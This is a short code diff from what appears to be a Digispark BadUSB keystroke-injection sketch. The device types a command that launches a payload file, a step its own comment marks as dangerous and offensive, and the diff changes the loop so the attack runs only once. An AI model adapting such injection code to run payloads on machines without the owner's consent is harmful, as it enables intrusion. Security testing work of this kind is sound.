@@ -54,5 +54,5 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.println("tmp.cmd && exit"); // Start the payload file and exit (DANGEROUS/OFFENSIVE STEP! Please comment this line if you want to test inoffensively on your own PC)
   digitalWrite(1, LOW); // LED off <--> Action end
-  DigiKeyboard.delay(5000); // 5 seconds delay to unplug the device safely between loops
+  for(;;){ /*Infinite loop to disconnect device*/ }
 }
